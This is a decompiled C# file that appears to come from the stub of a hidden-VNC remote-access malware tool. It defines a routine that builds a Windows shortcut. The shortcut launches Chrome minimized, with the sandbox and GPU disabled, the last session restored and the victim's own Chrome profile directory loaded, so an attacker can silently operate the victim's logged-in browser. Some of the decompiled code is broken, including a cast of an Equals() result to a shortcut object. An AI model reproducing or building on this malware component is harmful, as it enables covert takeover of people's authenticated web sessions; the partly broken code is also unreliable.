using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using BirdBrainmofo.IWshRuntimeLibrary;
using Microsoft.CSharp.RuntimeBinder;
using Binder = Microsoft.CSharp.RuntimeBinder.Binder;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x020000A7 RID: 167
	internal class ink
	{
		// Token: 0x06000841 RID: 2113 RVA: 0x0005A24C File Offset: 0x0005844C
		public static void CreateShortcut(string icon, string shortcutName, string description)
		{
			string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
			string text = Path.Combine(directoryName, shortcutName + ".lnk");
			if (!Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			new List<string>().Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
			string text2 = Path.Combine(folderPath, "Google\\Chrome\\Application\\chrome.exe");
			string text3 = Environment.GetEnvironmentVariable("LocalAppData");
			text3 = Path.Combine(text3, "Google\\Chrome");
			string text4 = Path.Combine(text3, "Chrome");
			Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
			 var ink_0 = Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
			if (ink.Lolo0._Lolo0 == null)
			{
				ink.Lolo0._Lolo0 = CallSite<Func<CallSite, object, IWshShortcut>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(IWshShortcut), typeof(ink)));
			}
			IWshShortcut wshShortcut = ink.Lolo0._Lolo0.Target(ink.Lolo0._Lolo0, ink_0.Equals(text));
			wshShortcut.TargetPath = text2;
			wshShortcut.Arguments = "  --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=" + text4;
			wshShortcut.Description = description;
			wshShortcut.Hotkey = "Ctrl+A";
			wshShortcut.IconLocation = icon;
			wshShortcut.WindowStyle = 7;
			wshShortcut.Save();
		}

		// Token: 0x06000842 RID: 2114 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x020000A8 RID: 168
		[CompilerGenerated]
		private static class Lolo0
        {
			// Token: 0x04000677 RID: 1655
			public static CallSite<Func<CallSite, object, IWshShortcut>> _Lolo0;
		}
	}
}
